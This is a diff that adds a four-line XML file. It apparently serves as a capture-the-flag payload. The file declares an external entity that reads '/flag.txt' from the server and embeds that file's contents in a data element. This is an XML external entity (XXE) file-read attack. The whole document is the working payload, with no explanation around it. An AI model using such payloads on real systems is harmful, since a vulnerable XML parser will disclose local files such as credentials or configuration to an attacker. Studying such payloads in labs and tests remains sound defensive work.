@@ -1,0 +1,4 @@
+<!DOCTYPE foo [
+<!ENTITY f SYSTEM "/flag.txt">
+]>
+<foo><data>&f;</data></foo>
